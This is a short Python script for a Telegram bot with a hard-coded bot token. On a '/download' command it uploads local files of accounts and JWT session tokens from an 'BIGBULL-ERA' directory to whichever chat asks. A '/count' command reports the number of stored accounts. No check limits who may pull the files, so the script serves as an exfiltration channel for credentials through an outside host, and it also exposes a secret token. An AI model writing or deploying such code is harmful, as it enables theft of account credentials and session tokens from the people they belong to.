import requests
import os
import threading

TELEGRAM_TOKEN = "8553943256:AAH55lzQDh5JvzlSL42hC2kBStvXwdjYjCY"

def send_file(cid, filepath):
    if os.path.exists(filepath) and os.path.getsize(filepath) > 2:
        with open(filepath, 'rb') as f:
            requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument",
                data={"chat_id": cid}, files={"document": f})

def run():
    offset = 0
    while True:
        try:
            r = requests.get(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/getUpdates?offset={offset}&timeout=30", timeout=35)
            for update in r.json().get("result", []):
                offset = update["update_id"] + 1
                msg = update.get("message", {}).get("text", "")
                cid = update.get("message", {}).get("chat", {}).get("id", "")
                if msg == "/download":
                    requests.get(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage?chat_id={cid}&text=Sending files...")
                    base = "/app/BIGBULL-ERA"
                    for fp in [f"{base}/ACCOUNTS/accounts-IND.json", f"{base}/RARE ACCOUNTS/rare-IND.json", f"{base}/COUPLES ACCOUNTS/couples-IND.json", f"{base}/TOKENS-JWT/tokens-IND.json"]:
                        send_file(cid, fp)
                elif msg == "/count":
                    count = 0
                    try:
                        import json
                        p = f"{base}/ACCOUNTS/accounts-IND.json"
                        if os.path.exists(p):
                            count = len(json.load(open(p)))
                    except: pass
                    requests.get(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage?chat_id={cid}&text=Total accounts: {count}")
        except Exception as e:
            print(f"Bot error: {e}")

run()
